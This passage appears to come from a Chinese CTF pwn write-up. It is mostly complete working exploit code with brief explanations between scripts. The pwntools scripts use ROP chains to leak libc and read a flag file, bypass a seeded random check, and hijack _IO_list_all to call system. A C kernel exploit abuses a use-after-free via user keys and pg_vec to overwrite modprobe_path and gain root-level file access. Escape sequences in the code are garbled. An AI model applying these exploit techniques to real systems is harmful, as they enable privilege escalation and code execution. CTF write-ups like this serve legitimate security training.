+<p>sh.interactive()</p>
+<p>context.log_level &#x3D; ‘debug’</p>
+<p>def get_heap():</p>
+<p>res &#x3D; 0</p>
+<p>res &#x3D; u64(sh.recvuntil(“x55”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>if res &#x3D;&#x3D; 0:</p>
+<p>res &#x3D; u64(sh.recvuntil(“x56”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>return res</p>
+<p>def get_libc():</p>
+<p>res &#x3D; 0</p>
+<p>res &#x3D; u64(sh.recvuntil(“x7f”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>if res &#x3D;&#x3D; 0:</p>
+<p>res &#x3D; u64(sh.recvuntil(“x7e”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>return res</p>
+<p>def get_tcache():</p>
+<p>res &#x3D; u64(sh.recvuntil(“x05”)[-5:].ljust(8, b“x00”))</p>
+<p>return res</p>
+<p>def func():</p>
+<p>pop_rdi &#x3D; 0x0000000000401393</p>
+<p>puts_got &#x3D; elf.got[‘puts’]</p>
+<p>puts_plt &#x3D; elf.plt[‘puts’]</p>
+<p>vuln &#x3D; 0x4012C0</p>
+<p>#ru(“lets move and pwn!”)</p>
+<p>pay &#x3D; b‘a’*0x108 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)</p>
+<p>sl(pay)</p>
+<p>puts &#x3D; u64(sh.recvuntil(“x7f”)[-6:].ljust(8, b‘x00’))</p>
+<p>print(“puts :”, hex(puts))</p>
+<p>libc &#x3D; ELF(“.&#x2F;libc.so.6”)</p>
+<p>base &#x3D; puts – libc.sym[‘puts’]</p>
+<p>print(“base :”, hex(base))</p>
+<p>_open &#x3D; base + libc.sym[‘open’]</p>
+<p>pop_rsi &#x3D; base + 0x000000000002601f</p>
+<p>flag &#x3D; base + 0x0000000000012efb</p>
+<p>print(“flag :”, hex(flag))</p>
+<p>pop_rdx &#x3D; base + 0x0000000000142c92</p>
+<p>pay &#x3D; b‘a’*0x108+p64(pop_rsi)+p64(0x404088)+p64(elf.plt[‘read’])+p64(vuln)</p>
+<p>sl(pay)</p>
+<p>pay &#x3D; b“flag”+b‘x00’*4</p>
+<p>pay +&#x3D; p64(pop_rdi) + p64(0x404088) + p64(pop_rsi) + p64(0) + p64(_open)</p>
+<p>pay +&#x3D; p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x404088+0x200) + p64(pop_rdx) + p64(0x100) + p64(elf.plt[‘read’])</p>
+<p>pay +&#x3D; p64(pop_rdi) + p64(0x404088+0x200) + p64(puts_plt)</p>
+<p>sl(pay)</p>
+<p>leave_ret &#x3D; 0x4012EE</p>
+<p>pop_rbp &#x3D; 0x000000000040117d</p>
+<p>dbg()</p>
+<p>pay &#x3D; b‘a’*0x108+p64(pop_rbp) + p64(0x404088) + p64(leave_ret)</p>
+<p>sl(pay)</p>
+<p>sh.interactive()</p>
+<p>if <strong>name</strong> &#x3D;&#x3D; “__main__”:</p>
+<p>func()</p>
+<p>signin</p>
+<p>首先是输入name，然后有一个关于随机数的校验，由于输入name存在溢出且输入之后存在一个printf %s的输出反馈，可以利用这个泄露随机数的时间种子，从而绕过；然后进入到主程序是一个菜单堆，且add功能中存在一个和signin_revenge中vuln函数逻辑一样的O_o漏洞函数，利用方法完全一致，不再赘述；</p>
+<p>Python</p>
+<p>from pwn import *</p>
+<p>import sys</p>
+<p>from ctypes import CDLL</p>
+<p>file &#x3D; “.&#x2F;vuln”</p>
+<p>if len(sys.argv) &#x3D;&#x3D; 1 or sys.argv[1] &#x3D;&#x3D; ‘l’:</p>
+<p>sh &#x3D; process(file)</p>
+<p>elif sys.argv[1] &#x3D;&#x3D; ‘r’:</p>
+<p>sh &#x3D; remote(“pwn-aaafe75338.challenge.xctf.org.cn”, 9999, ssl&#x3D;True)</p>
+<p>elf &#x3D; ELF(file)</p>
+<p>def ru(string):</p>
+<p>sh.recvuntil(string)</p>
+<p>def dbg():</p>
+<p>if len(sys.argv) &gt; 1 and sys.argv[1] &#x3D;&#x3D; ‘r’:</p>
+<p>return</p>
+<p>gdb.attach(sh)</p>
+<p>pause()</p>
+<p>def sl(content):</p>
+<p>sh.sendline(content)</p>
+<p>def itr():</p>
+<p>sh.interactive()</p>
+<p>context.log_level &#x3D; ‘debug’</p>
+<p>def get_heap():</p>
+<p>res &#x3D; 0</p>
+<p>res &#x3D; u64(sh.recvuntil(“x55”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>if res &#x3D;&#x3D; 0:</p>
+<p>res &#x3D; u64(sh.recvuntil(“x56”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>return res</p>
+<p>def get_libc():</p>
+<p>res &#x3D; 0</p>
+<p>res &#x3D; u64(sh.recvuntil(“x7f”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>if res &#x3D;&#x3D; 0:</p>
+<p>res &#x3D; u64(sh.recvuntil(“x7e”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>return res</p>
+<p>def get_tcache():</p>
+<p>res &#x3D; u64(sh.recvuntil(“x05”)[-5:].ljust(8, b“x00”))</p>
+<p>return res</p>
+<p>def attack():</p>
+<p>pop_rdi &#x3D; 0x0000000000401893</p>
+<p>puts_got &#x3D; elf.got[‘puts’]</p>
+<p>puts_plt &#x3D; elf.plt[‘puts’]</p>
+<p>vuln &#x3D; 0x4013C0</p>
+<p>#ru(“lets move and pwn!”)</p>
+<p>pay &#x3D; b‘a’*0x108 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)</p>
+<p>sl(pay)</p>
+<p>puts &#x3D; u64(sh.recvuntil(“x7f”)[-6:].ljust(8, b‘x00’))</p>
+<p>print(“puts :”, hex(puts))</p>
+<p>libc &#x3D; ELF(“.&#x2F;libc.so.6”)</p>
+<p>base &#x3D; puts – libc.sym[‘puts’]</p>
+<p>print(“base :”, hex(base))</p>
+<p>_open &#x3D; base + libc.sym[‘open’]</p>
+<p>pop_rsi &#x3D; base + 0x000000000002601f</p>
+<p>pop_rdx &#x3D; base + 0x0000000000142c92</p>
+<p>#dbg()</p>
+<p>#pay &#x3D; b’a’*0x108+p64(pop_rsi)+p64(0x404108)+p64(elf.plt[‘read’])+p64(vuln)</p>
+<p>pay &#x3D; b‘a’*0x108+p64(pop_rdi)+p64(0x404108)+p64(base+libc.sym[‘gets’])+p64(vuln)</p>
+<p>sl(pay)</p>
+<p>pay &#x3D; b“flag”.ljust(8, b‘x00’)</p>
+<p>pay +&#x3D; p64(pop_rdi) + p64(0x404108) + p64(pop_rsi) + p64(0) + p64(_open)</p>
+<p>pay +&#x3D; p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x404108+0x200) + p64(pop_rdx) + p64(0x100) + p64(elf.plt[‘read’])</p>
+<p>pay +&#x3D; p64(pop_rdi) + p64(0x404108+0x200) + p64(puts_plt) + p64(vuln)</p>
+<p>pay +&#x3D; p64(pop_rdi) + p64(1) + p64(0x404108+0x200) + p64(pop_rdx) + p64(0x100) + p64(base+libc.sym[‘write’])+p64(vuln)</p>
+<p>sl(pay)</p>
+<p>leave_ret &#x3D; 0x4013EE</p>
+<p>pop_rbp &#x3D; 0x000000000040127d</p>
+<p>pay &#x3D; b‘a’*0x108+p64(pop_rbp) + p64(0x404108) + p64(leave_ret)</p>
+<p>sl(pay)</p>
+<p>def func():</p>
+<p>h &#x3D; CDLL(“.&#x2F;libc.so.6”)</p>
+<p>sh.send(“n”*(0x16-0x8))</p>
+<p>ru(“User Name”)</p>
+<p>ru(“n”*(0x16-0x8))</p>
+<p>seed &#x3D; u32(sh.recv(4))</p>
+<p>print(“seed :”, hex(seed))</p>
+<p>h.srand(seed)</p>
+<p>for _ in range(100):</p>
+<p>num &#x3D; h.rand()</p>
+<p>num &#x3D; num % 100 + 1</p>
+<p>#print(“rand :”, num)</p>
+<p>ru(“Input the authentication code:”)</p>
+<p>sh.send(p32(num))</p>
+<p>ru(“&gt;&gt;”)</p>
+<p>sh.send(p32(1))</p>
+<p>ru(“Index:”)</p>
+<p>sh.send(p32(1))</p>
+<p>ru(“Note”)</p>
+<p>sh.send(“a”*0x100)</p>
+<p>attack()</p>
+<p>sh.interactive()</p>
+<p>if <strong>name</strong> &#x3D;&#x3D; “__main__”:</p>
+<p>func()</p>
+<p>ker</p>
+<p>kmalloc-64的UAF，（两次free、一次edit）存在cg隔离，因此使用内核密钥+pg_vec，首先分配该结构并释放，然后利用内核密钥占据该obj，之后再次释放，然后使用pg_vec占位，此时内核密钥被覆盖，长度被改写，通过越界读+爆破泄露内核地址，然后利用edit功能修改pg_vec为modprobe_path所在页，mmap映射，修改modprobe_path的内容，触发错误以在特权下修改flag权限，最终读出flag；</p>
+<p>C</p>
+<p>#define _GNU_SOURCE</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>&#x2F;&#x2F;CPU绑核</p>
+<p>void bindCore(int core)</p>
+<p>{</p>
+<p>cpu_set_t cpu_set;</p>
+<p>CPU_ZERO(&amp;cpu_set);</p>
+<p>CPU_SET(core, &amp;cpu_set);</p>
+<p>sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);</p>
+<p>printf(“ 33[34m 33[1m[*] Process binded to core  33[0m%dn”, core);</p>
+<p>}</p>
+<p>int dev_fd;</p>
+<p>void add_note(char *con){</p>
+<p>void *args &#x3D; con;</p>
+<p>ioctl(dev_fd, 0x20, &amp;args);</p>
+<p>}</p>
+<p>void free_note(){</p>
+<p>ioctl(dev_fd, 0x30, “AAAAAAAA”);</p>
+<p>}</p>
+<p>#include “key.h”</p>
+<p>&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; pg_vec &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>void err_exit(char *s){</p>
+<p>perror(s);</p>
+<p>exit(-1);</p>
+<p>}</p>
+<p>void unshare_setup(void)</p>
+<p>{</p>
+<p>char edit[0x100];</p>
+<p>int tmp_fd;</p>
+<p>if(unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))</p>
+<p>err_exit(“FAILED to create a new namespace”);</p>
+<p>tmp_fd &#x3D; open(“&#x2F;proc&#x2F;self&#x2F;setgroups”, O_WRONLY);</p>
+<p>write(tmp_fd, “deny”, strlen(“deny”));</p>
+<p>close(tmp_fd);</p>
+<p>tmp_fd &#x3D; open(“&#x2F;proc&#x2F;self&#x2F;uid_map”, O_WRONLY);</p>
+<p>snprintf(edit, sizeof(edit), “0 %d 1”, getuid());</p>
+<p>write(tmp_fd, edit, strlen(edit));</p>
+<p>close(tmp_fd);</p>
+<p>tmp_fd &#x3D; open(“&#x2F;proc&#x2F;self&#x2F;gid_map”, O_WRONLY);</p>
+<p>snprintf(edit, sizeof(edit), “0 %d 1”, getgid());</p>
+<p>write(tmp_fd, edit, strlen(edit));</p>
+<p>close(tmp_fd);</p>
+<p>}</p>
+<p>void packet_socket_rx_ring_init(int s, unsigned int block_size,</p>
+<p>unsigned int frame_size, unsigned int block_nr,</p>
+<p>unsigned int sizeof_priv, unsigned int timeout) {</p>
+<p>int v &#x3D; TPACKET_V3;</p>
+<p>int rv &#x3D; setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, sizeof(v));</p>
+<p>if (rv &lt; 0) puts(“setsockopt(PACKET_VERSION)”), exit(-1);</p>
+<p>struct tpacket_req3 req;</p>
+<p>memset(&amp;req, 0, sizeof(req));</p>
+<p>req.tp_block_size &#x3D; block_size;</p>
+<p>req.tp_frame_size &#x3D; frame_size;</p>
+<p>req.tp_block_nr &#x3D; block_nr;</p>
+<p>req.tp_frame_nr &#x3D; (block_size * block_nr) &#x2F; frame_size;</p>
+<p>req.tp_retire_blk_tov &#x3D; timeout;</p>
+<p>req.tp_sizeof_priv &#x3D; sizeof_priv;</p>
+<p>req.tp_feature_req_word &#x3D; 0;</p>
+<p>rv &#x3D; setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, sizeof(req));</p>
+<p>if (rv &lt; 0) puts(“setsockopt(PACKET_RX_RING)”), exit(-1);</p>
+<p>}</p>
+<p>int packet_socket_setup(unsigned int block_size, unsigned int frame_size,</p>
+<p>unsigned int block_nr, unsigned int sizeof_priv, int timeout) {</p>
+<p>int s &#x3D; socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</p>
+<p>if (s &lt; 0) puts(“socket(AF_PACKET)”), exit(-1);</p>
+<p>packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv, timeout);</p>
+<p>struct sockaddr_ll sa;</p>
+<p>memset(&amp;sa, 0, sizeof(sa));</p>
+<p>sa.sll_family &#x3D; PF_PACKET;</p>
+<p>sa.sll_protocol &#x3D; htons(ETH_P_ALL);</p>
+<p>sa.sll_ifindex &#x3D; if_nametoindex(“lo”);</p>
+<p>sa.sll_hatype &#x3D; 0;</p>
+<p>sa.sll_pkttype &#x3D; 0;</p>
+<p>sa.sll_halen &#x3D; 0;</p>
+<p>int rv &#x3D; bind(s, (struct sockaddr *)&amp;sa, sizeof(sa));</p>
+<p>if (rv &lt; 0) puts(“bind(AF_PACKET)”), exit(-1);</p>
+<p>return s;</p>
+<p>}</p>
+<p>&#x2F;&#x2F; count 为 pg_vec 数组的大小, 即 pg_vec 的大小为 count*8</p>
+<p>&#x2F;&#x2F; size&#x2F;4096 为要分配的 order</p>
+<p>int pagealloc_pad(int count, int size) {</p>
+<p>return packet_socket_setup(size, 2048, count, 0, 100);</p>
+<p>}</p>
+<p>&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>size_t ker_offset;</p>
+<p>void edit_note(char *con){</p>
+<p>void *args &#x3D; con;</p>
+<p>ioctl(dev_fd, 0x50, &amp;args);</p>
+<p>}</p>
+<p>void get_flag(){</p>
+<p>system(“touch .&#x2F;tmp&#x2F;error”);</p>
+<p>int efd &#x3D; open(“.&#x2F;tmp&#x2F;error”, 2);</p>
+<p>write(efd, “xffxffxffxff”, 4);</p>
+<p>close(efd);</p>
+<p>system(“chmod +x .&#x2F;tmp&#x2F;error”);</p>
+<p>char *cmd &#x3D; “#!&#x2F;bin&#x2F;shnchmod 777 &#x2F;flag”;</p>
+<p>system(“touch .&#x2F;tmp&#x2F;my_shell.sh”);</p>
+<p>int f &#x3D; open(“.&#x2F;tmp&#x2F;my_shell.sh”, 2);</p>
+<p>write(f, cmd, strlen(cmd));</p>
+<p>close(f);</p>
+<p>system(“chmod +x .&#x2F;tmp&#x2F;my_shell.sh”);</p>
+<p>system(“.&#x2F;tmp&#x2F;error”);</p>
+<p>char flag[0x1000];</p>
+<p>int fd3 &#x3D; open(“&#x2F;flag”, 2);</p>
+<p>printf(“fd3 &#x3D;&#x3D; %dn”, fd3);</p>
+<p>read(fd3, flag, 0x80);</p>
+<p>puts(flag);</p>
+<p>&#x2F;&#x2F;getchar();</p>
+<p>}</p>
+<p>int main(){</p>
+<p>bindCore(0);</p>
+<p>unshare_setup();</p>
+<p>dev_fd &#x3D; open(“&#x2F;dev&#x2F;ker”, 0);</p>
+<p>printf(“dev_fd &#x3D;&#x3D; %dn”, dev_fd);</p>
+<p>add_note(“AAAAAAAA”);</p>
+<p>free_note();</p>
+<p>#define TOTAL_KEYS 200</p>
+<p>int key_ids[TOTAL_KEYS];</p>
+<p>char des[0x100];</p>
+<p>char pay[0x100];</p>
+<p>memset(des, 0, sizeof(des));</p>
+<p>memset(pay, 0, sizeof(pay));</p>
+<p>for(int i &#x3D; 0; i &lt; TOTAL_KEYS; i++){</p>
+<p>memset(des, ‘A’+i, 0x80);</p>
+<p>memset(pay, ‘a’+i, 0x40-0x18);</p>
+<p>key_ids[i] &#x3D; key_alloc(des, pay, 0x40-0x18);</p>
+<p>&#x2F;&#x2F;printf(“kid &#x3D;&#x3D; %dn”, key_ids[i]);</p>
+<p>}</p>
+<p>free_note();</p>
+<p>#define TOTAL_PFDS 200</p>
+<p>int pfds[TOTAL_PFDS];</p>
+<p>for(int i &#x3D; 0; i &lt; TOTAL_PFDS; i++){</p>
+<p>pfds[i] &#x3D; pagealloc_pad(8, 0x1000);</p>
+<p>if(pfds[i] &lt; 0){</p>
+<p>perror(“pfds”);</p>
+<p>break;</p>
+<p>}</p>
+<p>&#x2F;&#x2F;printf(“pfd &#x3D;&#x3D; %dn”, pfds[i]);</p>
+<p>}</p>
+<p>int victim_kid &#x3D; -1;</p>
+<p>size_t data[0x10000];</p>
+<p>int keylen;</p>
+<p>for(int i &#x3D; 0; i &lt; TOTAL_KEYS; i++){</p>
+<p>keylen &#x3D; key_read(key_ids[i], data, 0x40-0x18);</p>
+<p>if(keylen &gt; 0x28){</p>
+<p>victim_kid &#x3D; i;</p>
+<p>break;</p>
+<p>}</p>
+<p>}</p>
+<p>printf(“victim_kid &#x3D;&#x3D; %dn”, victim_kid);</p>
+<p>for(int i &#x3D; 0; i &lt; TOTAL_KEYS; i++){</p>
+<p>if(i &#x3D;&#x3D; victim_kid) continue;</p>
+<p>key_revoke(key_ids[i]);</p>
+<p>}</p>
+<p>&#x2F;&#x2F;leak goal 0xffffffff81d5d250</p>
+<p>size_t leak &#x3D; 0LL;</p>
+<p>key_read(key_ids[victim_kid], data, keylen);</p>
+<p>for(int i &#x3D; 0; i &lt; 0x1000; i++){</p>
+<p>&#x2F;&#x2F;printf(“leak : %pn”, (void *)data[i]);</p>
+<p>if(data[i] &gt;&#x3D; 0xffffffff00000000){</p>
+<p>if((data[i] &amp; 0xffff) &#x3D;&#x3D; 0xd250){</p>
+<p>leak &#x3D; data[i];</p>
+<p>ker_offset &#x3D; leak – 0xffffffff81d5d250;</p>
+<p>break;</p>
+<p>}</p>
+<p>if((data[i] &amp; 0xffff) &#x3D;&#x3D; 0x6070){</p>
+<p>leak &#x3D; data[i];</p>
+<p>ker_offset &#x3D; leak – 0xffffffff81e26070;</p>
+<p>break;</p>
+<p>}</p>
+<p>if((data[i] &amp; 0xffff) &#x3D;&#x3D; 0x8850){</p>
+<p>leak &#x3D; data[i];</p>
+<p>ker_offset &#x3D; leak – 0xffffffff81608850;</p>
+<p>break;</p>
+<p>}</p>
+<p>if((data[i] &amp; 0xffff) &#x3D;&#x3D; 0xca40){</p>
+<p>leak &#x3D; data[i];</p>
+<p>ker_offset &#x3D; leak – 0xffffffff8236ca40;</p>
+<p>break;</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>printf(“leak &#x3D;&#x3D; %pn”, (void *)leak);</p>
+<p>printf(“ker_offset &#x3D;&#x3D; %pn”, (void *)ker_offset);</p>
+<p>size_t func_addr &#x3D; ker_offset + 0xffffffff810fc6e0;</p>
+<p>size_t modprobe &#x3D; ker_offset + 0xffffffff831d8ce0;</p>
+<p>printf(“goal : %pn”, (void *)func_addr);</p>
+<p>&#x2F;&#x2F;size_t goal_page &#x3D; func_addr – (func_addr &amp; 0xfff);</p>
+<p>size_t goal_page &#x3D; modprobe – (modprobe &amp; 0xfff);</p>
+<p>edit_note(&amp;goal_page);</p>
+<p>char *pages[TOTAL_PFDS];</p>
+<p>for(int i &#x3D; 0; i &lt; TOTAL_PFDS; i++){</p>
+<p>pages[i] &#x3D; mmap(NULL, 0x1000*8, PROT_READ|PROT_WRITE, MAP_SHARED, pfds[i], 0);</p>
+<p>if (pages[i] &#x3D;&#x3D; MAP_FAILED) {</p>
+<p>printf(“fail mmap id : %d, file descriptor &#x3D;&#x3D; %dn”, i, pfds[i]);</p>
+<p>perror(“mmap”);</p>
+<p>break;</p>
+<p>}</p>
+<p>}</p>
+<p>puts(“mmap done”);</p>
+<p>&#x2F;&#x2F;getchar();</p>
+<p>char file[] &#x3D; “&#x2F;tmp&#x2F;tmp&#x2F;my_shell.sh”;</p>
+<p>for(int i &#x3D; 0; i &lt; TOTAL_PFDS; i++){</p>
+<p>printf(“page &#x3D;&#x3D; %pn”, pages[i]);</p>
+<p>memcpy(pages[i]+(modprobe&amp;0xfff), file, strlen(file));</p>
+<p>}</p>
+<p>puts(“write done”);</p>
+<p>&#x2F;&#x2F;getchar();</p>
+<p>get_flag();</p>
+<p>}</p>
+<p>C</p>
+<p>#include</p>
+<p>#include</p>
+<p>#include</p>
+<p>#define KEY_SPEC_PROCESS_KEYRING    -2  &#x2F;* – key ID for process-specifi*&#x2F;</p>
+<p>#define KEYCTL_UPDATE           2   &#x2F;* update a key *&#x2F;</p>
+<p>#define KEYCTL_REVOKE           3   &#x2F;* revoke a key *&#x2F;</p>
+<p>#define KEYCTL_UNLINK           9   &#x2F;* unlink a key from a keyring *&#x2F;</p>
+<p>#define KEYCTL_READ         11  &#x2F;* read a key or keyring’s cont*&#x2F;</p>
+<p>int key_alloc(char *description, char *payload, size_t plen)</p>
+<p>{</p>
+<p>return syscall(__NR_add_key, “user”, description, payload, plen,</p>
+<p>KEY_SPEC_PROCESS_KEYRING);</p>
+<p>}</p>
+<p>int key_update(int keyid, char *payload, size_t plen)</p>
+<p>{</p>
+<p>return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);</p>
+<p>}</p>
+<p>int key_read(int keyid, char *buffer, size_t buflen)</p>
+<p>{</p>
+<p>return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</p>
+<p>}</p>
+<p>int key_revoke(int keyid)</p>
+<p>{</p>
+<p>return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);</p>
+<p>}</p>
+<p>int key_unlink(int keyid)</p>
+<p>{</p>
+<p>return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);</p>
+<p>}</p>
+<p>guest_book</p>
+<p>size非常大的菜单堆，存在UAF，使用largebin attack劫持IO_list_all打house of apple2：</p>
+<p>Python</p>
+<p>from pwn import *</p>
+<p>import sys</p>
+<p>file &#x3D; “.&#x2F;pwn”</p>
+<p>if len(sys.argv) &#x3D;&#x3D; 1 or sys.argv[1] &#x3D;&#x3D; ‘l’:</p>
+<p>sh &#x3D; process(file)</p>
+<p>elif sys.argv[1] &#x3D;&#x3D; ‘r’:</p>
+<p>sh &#x3D; remote(“pwn-d96cac3186.challenge.xctf.org.cn”, 9999, ssl&#x3D;True)</p>
+<p>elf &#x3D; ELF(file)</p>
+<p>def ru(string):</p>
+<p>sh.recvuntil(string)</p>
+<p>def dbg():</p>
+<p>if len(sys.argv) &gt; 1 and sys.argv[1] &#x3D;&#x3D; ‘r’:</p>
+<p>return</p>
+<p>gdb.attach(sh)</p>
+<p>pause()</p>
+<p>def sl(content):</p>
+<p>sh.sendline(content)</p>
+<p>def itr():</p>
+<p>sh.interactive()</p>
+<p>context.log_level &#x3D; ‘debug’</p>
+<p>def get_heap():</p>
+<p>res &#x3D; 0</p>
+<p>res &#x3D; u64(sh.recvuntil(“x55”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>if res &#x3D;&#x3D; 0:</p>
+<p>res &#x3D; u64(sh.recvuntil(“x56”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>return res</p>
+<p>def get_libc():</p>
+<p>res &#x3D; 0</p>
+<p>res &#x3D; u64(sh.recvuntil(“x7f”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>if res &#x3D;&#x3D; 0:</p>
+<p>res &#x3D; u64(sh.recvuntil(“x7e”, timeout&#x3D;0.2)[-6:].ljust(8, b‘x00’))</p>
+<p>return res</p>
+<p>def get_tcache():</p>
+<p>res &#x3D; u64(sh.recvuntil(“x05”)[-5:].ljust(8, b“x00”))</p>
+<p>return res</p>
+<p>def choice(num):</p>
+<p>ru(“&gt;”)</p>
+<p>sl(str(num))</p>
+<p>def add(idx, size):</p>
+<p>choice(1)</p>
+<p>ru(“index”)</p>
+<p>sl(str(idx))</p>
+<p>ru(“size”)</p>
+<p>sl(str(size))</p>
+<p>def show(idx):</p>
+<p>choice(4)</p>
+<p>ru(“index”)</p>
+<p>sl(str(idx))</p>
+<p>def edit(idx, con):</p>
+<p>choice(2)</p>
+<p>ru(“index”)</p>
+<p>sl(str(idx))</p>
+<p>ru(“content”)</p>
+<p>sh.send(con)</p>
+<p>def free(idx):</p>
+<p>choice(3)</p>
+<p>ru(“index”)</p>
+<p>sl(str(idx))</p>
+<p>def func():</p>
+<p>add(0, 0x5a0)</p>
+<p>add(1, 0x508)</p>
+<p>add(2, 0x580)</p>
+<p>add(3, 0x500)</p>
+<p>free(0)</p>
+<p>show(0)</p>
+<p>addr &#x3D; u64(sh.recvuntil(b“x7f”)[-6:].ljust(8, b‘x00’))</p>
+<p>print(“addr :”, hex(addr))</p>
+<p>read &#x3D; addr – 0x106510</p>
+<p>libc &#x3D; ELF(“.&#x2F;libc.so.6”)</p>
+<p>base &#x3D; read – libc.sym[‘read’]</p>
+<p>print(“base :”, hex(base))</p>
+<p>listall &#x3D; base + libc.sym[‘_IO_list_all’]</p>
+<p>pause()</p>
+<p>add(4, 0x600)</p>
+<p>pay &#x3D; p64(0)*3+p64(listall-0x20)</p>
+<p>edit(0, pay)</p>
+<p>free(2)</p>
+<p>add(5, 0x600)</p>
+<p>edit(2, ‘a’*8)</p>
+<p>show(2)</p>
+<p>heap &#x3D; u64(sh.recvuntil(b“x55”)[-6:].ljust(8, b‘x00’))</p>
+<p>print(“heap :”, hex(heap))</p>
+<p>f1_addr &#x3D; heap + 0xac0</p>
+<p>print(“f1_addr :”, hex(f1_addr))</p>
+<p>pause()</p>
+<p>pay &#x3D; b‘a’*0x500+b‘  _;shx00′</p>
+<p>edit(1, pay)</p>
+<p>system &#x3D; base + libc.sym[‘system’]</p>
+<p>jumps &#x3D; base + libc.sym[‘_IO_wfile_jumps’]</p>
+<p>pay &#x3D; b‘x00’*0x18+p64(1)</p>
+<p>pay &#x3D; pay.ljust(0x58, b‘x00’)</p>
+<p>pay +&#x3D; p64(system)</p>
+<p>pay &#x3D; pay.ljust(0x90, b‘x00’)</p>
+<p>pay +&#x3D; p64(f1_addr)</p>
+<p>pay &#x3D; pay.ljust(0xc8, b‘x00’)</p>
+<p>pay +&#x3D; p64(jumps)</p>
+<p>pay +&#x3D; p64(f1_addr)</p>
+<p>edit(2, pay)</p>
+<p>dbg()</p>
+<p>sh.interactive()</p>
+<p>if <strong>name</strong> &#x3D;&#x3D; “__main__”:</p>
+<p>func()</p>
+<p>Reverse:</p>
+<p>serv1ce</p>
+<p>JSON</p>
+<p>#include</p>
+<p>int main()</p>
+<p>{</p>
+<p>char enc[] &#x3D; { 0xB9, 0x32, 0xC2, 0xD4, 0x69, 0xD5, 0xCA, 0xFB, 0xF8, 0xFB,</p>
